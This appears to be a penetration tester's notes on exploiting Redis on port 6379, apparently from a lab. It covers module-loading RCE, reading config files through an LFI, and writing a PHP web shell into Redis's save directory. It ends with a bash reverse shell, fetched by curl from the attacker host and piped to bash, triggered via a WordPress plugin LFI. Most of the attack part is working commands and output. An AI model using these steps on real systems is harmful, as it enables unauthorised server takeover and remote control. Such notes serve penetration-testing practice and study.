https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

#### Download Redis

OPTION 1:

```bash - kali
sudo apt install redis-tools
```

```bash - kali
redis-cli -h $TARGET -a Ready4Redis?
```

If password doesn't work try obtaining the [[#Redis config files]].

xxx.xxx.xxx.xxx:6379> `ping`
`PONG`

```bash - kali
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand && cd RedisModules-ExecuteCommand
```

```bash - kali
sudo make
```

Upload module.so into victim (Example by FTP):

We can google "ftp pub directory" to find that the default location is in /var/ftp/pub.

>/var/ftp/pub/module.so

### Redis RCE
```bash - kali
redis-cli -h $TARGET
```

```bash - kali
MODULE LOAD /var/ftp/pub/module.so
```

```bash - kali
system.exec "id"
```

[[Port 22 - SSH  ~#Generate key upload to victim]]

### Redis config files
Use with LFI vulnerability.

```bash - kali
curl http:$TARGET/?path=/etc/redis/redis.conf -o redis.conf
```

```bash - kali
curl http:$TARGET/?path=/etc/systemd/system/redis.service
```

#### Redis webshell
After logging in successfully:
Try with /var/www/ and /var/www/html.
```bash - kali
xxx.xxx.xxx.xxx:6379> config set dir /var/www/html
OK
xxx.xxx.xxx.xxx:6379> config set dbfilename test.php
OK
xxx.xxx.xxx.xxx:6379> set test "<?php system('id'); ?>"
OK
xxx.xxx.xxx.xxx:6379> save
(error) ERR
```

If you get an error as seen above, try obtaining redis.service file from [[#Redis config files]] and note where ReadWriteDirectories variable points to. 
```bash - kali
...
ReadWriteDirectories=-/etc/redis
ReadWriteDirectories=-/opt/redis-files
...
```

Try the steps again with the new paths:
```bash - kali
xxx.xxx.xxx.xxx:6379> config set dir /opt/redis-files
OK
xxx.xxx.xxx.xxx:6379> config set dbfilename test.php
OK
xxx.xxx.xxx.xxx:6379> set test "<?php system('id'); ?>"
OK
xxx.xxx.xxx.xxx:6379> save
OK
xxx.xxx.xxx.xxx:6379> 
```

We can then use LFI to read this file. The contents will be in Redis RDB format so let's output it to a file and run `strings`.

```bash - kali
┌──(kali㉿kali)-[~]
└─$ curl http://$TARGET/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php -o test.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   193  100   193    0     0   2014      0 --:--:-- --:--:-- --:--:--  2031
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ file test.php                  
test.php: Redis RDB file, version 0009
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ strings test.php      
REDIS0009
        redis-ver
5.0.14
redis-bits
ctime
used-mem
aof-preamble
test
uid=1000(alice) gid=1000(alice) groups=1000(alice)
 {"success":true,"data":{"output":[]}}
```


The output from the `id` command can be found in this file. This means we can execute a reverse shell using this method. Let's start by creating a file on our kali host named **shell.sh** with the following contents.

```bash - kali
#!/bin/bash
/bin/bash -i >& /dev/tcp/$KALI/443 0>&1
```

Let's host this file using a python webserver to make it available to the target.

![[Python#Server]]

We then need to start a listener to catch the reverse shell.
![[rlwrap]]

Next, let's use our Redis session to cause the target to download and pipe **shell.sh** into `bash`.

```bash - kali
xxx.xxx.xxx.xxx:6379> config set dir /opt/redis-files
OK
xxx.xxx.xxx.xxx:6379> config set dbfilename test.php
OK
xxx.xxx.xxx.xxx:6379> set test "<?php system('curl $KALI/shell.sh | bash'); ?>"
OK
```

Finally, we trigger our reverse shell by using the WordPress LFI.

```bash - kali
curl http:$TARGET/?path=/opt/redis-files/test.php
```

This command will hang, and we will receive a connection to our listener.

```bash - kali
connect to [$KALI] from (UNKNOWN) [xxx.xxx.xxx.xxx] 45752
bash: cannot set terminal process group (551): Inappropriate ioctl for device
bash: no job control in this shell
<ite-editor/editor/extensions/pagebuilder/includes$ whoami
whoami
alice
<ite-editor/editor/extensions/pagebuilder/includes$ id
id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```
